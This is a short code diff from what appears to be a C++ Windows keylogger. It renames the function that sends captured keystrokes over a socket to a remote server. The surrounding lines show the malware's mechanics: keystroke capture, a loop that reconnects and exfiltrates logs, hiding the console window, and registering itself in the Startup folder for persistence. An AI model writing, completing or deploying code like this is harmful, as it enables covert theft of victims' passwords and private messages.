@@ -455,7 +455,7 @@ bool captureKeys(int key)
     }
 }
 
-int transferLogs()
+int SendLogs()
 {
     string buffer, text;
     char bufsize[1024];
@@ -474,7 +474,7 @@ int transferLogs()
     client.sin_port = htons(PORT);
     client.sin_addr.s_addr = inet_addr(SERVER.c_str());
     if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
-        closesocket(objSocket); WSACleanup(); transferLogs();
+        closesocket(objSocket); WSACleanup(); SendLogs();
     }
 
     while (true)
@@ -487,7 +487,7 @@ int transferLogs()
         sender = send(objSocket, text.c_str(), text.length(), 0);
 
         if (sender == 0 or sender == SOCKET_ERROR) {
-            closesocket(objSocket); WSACleanup(); transferLogs();
+            closesocket(objSocket); WSACleanup(); SendLogs();
             
         } text.clear(); buffer.clear();
         
@@ -500,7 +500,7 @@ int main()
     if (noConsole) FreeConsole(); // Disable Terminal Pop-Up
     if (startup) RegisterStartup(__FILE__); // Register to Startup Folder
 
-    thread t(transferLogs);
+    thread t(SendLogs);
     t.detach();
 
     while (true)
